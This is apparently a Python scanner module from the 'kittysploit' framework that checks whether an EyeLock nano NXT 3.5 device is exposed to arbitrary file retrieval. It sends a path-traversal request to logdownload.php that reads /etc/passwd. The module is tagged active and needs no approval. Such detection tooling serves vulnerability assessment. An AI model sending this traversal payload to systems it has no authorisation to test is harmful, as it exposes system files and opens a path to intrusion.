#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""EyeLock nano NXT suffers from a file retrieval vulnerability when input passed through the 'path' parameter to."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EyeLock nano NXT 3.5 - Arbitrary File Retrieval Detection',
        'description': "EyeLock nano NXT suffers from a file retrieval vulnerability when input passed through the 'path' parameter to 'logdownload.php' script is not properly verified before being used to read files. This can be exploited to disclose contents of files from local resources.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'iot', 'lfi', 'eyelock', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.zeroscience.mk/codes/eyelock_lfd.txt'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="EyeLock nano NXT 3.5 - Arbitrary File Retrieval detected",
                path='/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd',
            )
            return True
        return False

